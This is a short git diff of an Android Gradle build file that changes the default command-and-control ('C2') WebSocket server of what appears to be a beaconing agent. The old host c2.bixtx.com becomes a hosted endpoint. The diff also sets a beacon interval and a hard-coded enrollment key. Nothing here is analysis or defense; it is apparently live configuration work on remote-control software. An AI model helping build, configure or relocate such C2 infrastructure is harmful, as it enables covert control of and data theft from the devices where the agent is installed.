@@ -27,8 +27,8 @@ android {
         versionName = "4.7.2"
 
         // C2 config — inject via Gradle property or env var at build time:
-        //   ./gradlew assembleRelease -Pc2WsUrl="wss://c2.bixtx.com:3001" -PbeaconInterval=30
-        buildConfigField("String",  "C2_WS_URL",        "\"${prop("c2WsUrl", "C2_WS_URL", "wss://c2.bixtx.com:3001")}\"")
+        //   ./gradlew assembleRelease -Pc2WsUrl="wss://bixtx.onrender.com/agent" -PbeaconInterval=30
+        buildConfigField("String",  "C2_WS_URL",        "\"${prop("c2WsUrl", "C2_WS_URL", "wss://bixtx.onrender.com/agent")}\"")
         buildConfigField("int",     "BEACON_INTERVAL",  prop("beaconInterval", "BEACON_INTERVAL", "30"))
         buildConfigField("String",  "ENROLL_KEY",       "\"${prop("enrollKey", "BIXTX_ENROLL_KEY", "BTX-2026-ALPHA")}\"")
         buildConfigField("String",  "AGENT_VERSION",    "\"4.7.2\"")
